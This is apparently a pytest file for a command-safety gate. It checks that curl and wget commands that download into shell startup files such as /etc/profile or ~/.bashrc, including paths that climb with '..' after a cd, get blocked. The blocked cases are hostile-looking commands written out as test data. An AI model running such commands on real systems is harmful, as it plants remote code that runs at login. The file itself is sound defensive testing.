"""A download or redirect target that climbs with .. from the folder an earlier cd reached is read from where it lands.
Mirrors packages/zn-gate/test/destructive_dotdot_after_cd.test.js. Only example paths and reserved hosts; nothing is run."""
import pytest

from zn_gate.destructive import check_command


def rule(cmd):
    r = check_command(cmd)
    return str(r.rule).replace("destructive:", "") if r.verdict == "block" else "allow"


@pytest.mark.parametrize(
    "cmd",
    [
        "cd /opt && curl -o ../etc/profile https://example.com/x",
        "cd /opt/app && curl -o ../../etc/profile https://example.com/x",
        "cd /tmp && wget -O ../../etc/profile.d/x.sh https://example.com/x",
        "cd /opt && curl --output ../etc/profile https://example.com/x",
        "cd /opt && curl https://example.com/x > ../etc/profile",
        "cd /opt && curl https://example.com/x | tee ../etc/profile",
        "cd /opt && cd .. && curl -o etc/profile https://example.com/x",
        "cd ~ && curl -o .bashrc https://example.com/x",
        "cd ~ && curl -o sub/../.bashrc https://example.com/x",
        "cd ~ && curl -o ../../etc/profile https://example.com/x",
        # A home of /root climbs to / in one step, /home/<user> in two: the shorter one is assumed.
        "cd ~ && curl -o ../etc/profile https://example.com/x",
        "cd /home/u && curl -o ../../etc/profile https://example.com/x",
        "cd /root && curl -o ../etc/profile https://example.com/x",
        "cd $HOME && wget -O ../etc/profile.d/x.sh https://example.com/x",
        "cd ~ && wget -O ../../etc/profile.d/x.sh https://example.com/x",
        "cd $HOME && curl -o ../../etc/profile https://example.com/x",
        "cd ~/app && curl -o ../../../etc/profile https://example.com/x",
    ],
)
def test_blocked(cmd):
    assert rule(cmd) == "rc_download"


@pytest.mark.parametrize(
    "cmd",
    [
        "cd /opt/app && curl -o ../data/x.bin https://example.com/x",
        "cd /opt/app && curl -o ../../etc/hosts.example https://example.com/x",
        "cd /opt/app/.. && curl -o app/x.bin https://example.com/x",
        "cd ~ && curl -o ../../etc/passwd https://example.com/x",
        # Stays inside home, or lands beside it at /home level where nothing is protected.
        "cd ~/app && curl -o ../data/x.bin https://example.com/x",
        "cd ~ && curl -o ../other/x.bin https://example.com/x",
        "cd /home/u && curl -o ../other/x.bin https://example.com/x",
        "cd $DIR && curl -o ../etc/profile https://example.com/x",
        "curl -o ../etc/profile https://example.com/x",
        "curl -o notes.txt https://example.com/x",
    ],
)
def test_allowed(cmd):
    assert rule(cmd) == "allow"
